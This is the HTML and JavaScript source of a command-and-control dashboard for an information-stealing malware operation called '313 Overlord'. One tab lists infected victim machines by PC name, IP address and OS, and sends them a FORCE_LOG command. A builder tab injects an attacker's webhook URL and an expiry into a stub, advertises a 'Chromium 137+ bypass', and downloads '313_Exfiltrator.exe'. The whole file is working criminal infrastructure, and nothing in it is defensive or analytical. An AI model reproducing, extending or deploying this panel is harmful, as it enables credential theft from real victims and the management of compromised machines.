<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>313 // DASHBOARD</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        body { background: #000; color: #fff; font-family: 'JetBrains Mono', monospace; overflow: hidden; }
        .sidebar-item.active { background: #fff; color: #000; }
        .terminal { background: #050505; border: 1px solid #111; height: 180px; overflow-y: auto; font-size: 10px; }
        #spotlight {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none;
            background: radial-gradient(circle 250px at var(--x) var(--y), rgba(255,255,255,0.03), transparent 80%);
            z-index: 100;
        }
        ::-webkit-scrollbar { width: 2px; }
        ::-webkit-scrollbar-thumb { background: #333; }
    </style>
</head>
<body class="flex h-screen">
    <div id="spotlight"></div>

    <!-- Sidebar -->
    <aside class="w-64 border-r border-zinc-900 flex flex-col p-8">
        <div class="flex items-center space-x-3 mb-12">
            <div class="w-6 h-6 border border-white flex items-center justify-center font-bold text-xs">313</div>
            <span class="text-[10px] tracking-widest font-bold">OVERLORD</span>
        </div>

        <nav class="flex-1 space-y-2">
            <button onclick="switchTab('nodes')" class="w-full sidebar-item active flex items-center space-x-4 p-3 text-[10px] uppercase tracking-widest transition">
                <i data-lucide="layout-grid" class="w-4 h-4"></i> <span>Nodes</span>
            </button>
            <button onclick="switchTab('builder')" class="w-full sidebar-item flex items-center space-x-4 p-3 text-[10px] uppercase tracking-widest transition">
                <i data-lucide="cpu" class="w-4 h-4"></i> <span>Builder</span>
            </button>
        </nav>

        <a href="/logout" class="text-zinc-600 hover:text-white text-[10px] uppercase tracking-widest flex items-center space-x-3">
            <i data-lucide="log-out" class="w-4 h-4"></i> <span>Exit</span>
        </a>
    </aside>

    <!-- Content -->
    <main class="flex-1 p-12 overflow-y-auto">
        
        <!-- Tab: Nodes -->
        <div id="tab-nodes" class="tab-content">
            <div class="flex justify-between items-end mb-10">
                <h1 class="text-3xl font-bold tracking-tighter uppercase italic">Infected Nodes_</h1>
                <div class="text-right">
                    <p class="text-[8px] text-zinc-600 uppercase">Total Access</p>
                    <p class="text-xl" id="count">0</p>
                </div>
            </div>

            <div class="border border-zinc-900 rounded-sm overflow-hidden">
                <table class="w-full text-left text-[10px]">
                    <thead class="bg-white/5 uppercase text-zinc-500">
                        <tr>
                            <th class="p-4">PC Name</th>
                            <th class="p-4">IP Address</th>
                            <th class="p-4">OS</th>
                            <th class="p-4">Last Ping</th>
                            <th class="p-4 text-right">Control</th>
                        </tr>
                    </thead>
                    <tbody id="node-list" class="divide-y divide-zinc-900">
                        <!-- Data load -->
                    </tbody>
                </table>
            </div>
        </div>

        <!-- Tab: Builder -->
        <div id="tab-builder" class="tab-content hidden">
            <h1 class="text-3xl font-bold tracking-tighter uppercase italic mb-10">Stub Engine_</h1>
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-10">
                <div class="space-y-6">
                    <div class="p-6 bg-[#050505] border border-zinc-900 space-y-4">
                        <div>
                            <label class="block text-[8px] text-zinc-600 uppercase mb-2">Webhook URL</label>
                            <input type="text" id="webhook" class="w-full bg-black border border-zinc-800 p-3 text-[10px] focus:border-white outline-none">
                        </div>
                        <div>
                            <label class="block text-[8px] text-zinc-600 uppercase mb-2">Expiry (Days)</label>
                            <input type="number" id="expiry" value="7" class="w-full bg-black border border-zinc-800 p-3 text-[10px] focus:border-white outline-none">
                        </div>
                        <button onclick="startBuild()" class="w-full bg-white text-black font-bold py-4 text-[10px] tracking-widest hover:bg-zinc-300 transition">GENERATE BINARY</button>
                    </div>
                </div>
                <div class="terminal p-6" id="term">
                    <div id="logs" class="text-zinc-500 space-y-1">
                        <p>> Awaiting initialization...</p>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <script>
        lucide.createIcons();
        document.addEventListener('mousemove', (e) => {
            document.documentElement.style.setProperty('--x', e.clientX + 'px');
            document.documentElement.style.setProperty('--y', e.clientY + 'px');
        });

        function switchTab(id) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.add('hidden'));
            document.querySelectorAll('.sidebar-item').forEach(b => b.classList.remove('active'));
            document.getElementById('tab-' + id).classList.remove('hidden');
            event.currentTarget.classList.add('active');
        }

        async function loadNodes() {
            const res = await fetch('/api/nodes');
            const data = await res.json();
            document.getElementById('count').innerText = data.length;
            document.getElementById('node-list').innerHTML = data.map(n => `
                <tr class="hover:bg-white/5 transition">
                    <td class="p-4 text-white">${n.pc_name}</td>
                    <td class="p-4 text-zinc-400">${n.ip_address}</td>
                    <td class="p-4 text-zinc-600">${n.os_info}</td>
                    <td class="p-4 text-zinc-500">${new Date(n.last_ping).toLocaleString()}</td>
                    <td class="p-4 text-right">
                        <button onclick="refreshNode('${n.pc_name}')" class="border border-zinc-800 px-3 py-1 hover:border-white transition uppercase text-[8px]">Refresh</button>
                    </td>
                </tr>
            `).join('');
        }

        async function refreshNode(pc) {
            await fetch('/api/command', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({pc_name: pc}) });
            alert("Order Dispatched: FORCE_LOG");
        }

        async function startBuild() {
            const l = document.getElementById('logs');
            const add = (txt) => { l.innerHTML += `<p>> ${txt}</p>`; document.getElementById('term').scrollTop = 9999; };
            l.innerHTML = "";
            add("AUTHENTICATING BUILD REQUEST...");
            await new Promise(r => setTimeout(r, 600));
            add("FETCHING STUB V1.5.0 (CHROMIUM 137+ BYPASS)...");
            add("INJECTING WEBHOOK AND EXPIRY OVERLAY...");
            
            const formData = new URLSearchParams();
            formData.append('webhook', document.getElementById('webhook').value);
            formData.append('expiry_days', document.getElementById('expiry').value);
            
            const res = await fetch('/build', { method: 'POST', body: formData });
            if (res.ok) {
                add("SUCCESS: BINARY ARMED AND READY.");
                const blob = await res.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a'); a.href = url; a.download = "313_Exfiltrator.exe"; a.click();
            } else {
                add("ERROR: FAILED TO INJECT RESOURCES.");
            }
        }

        setInterval(loadNodes, 5000);
        loadNodes();
    </script>
</body>
</html>
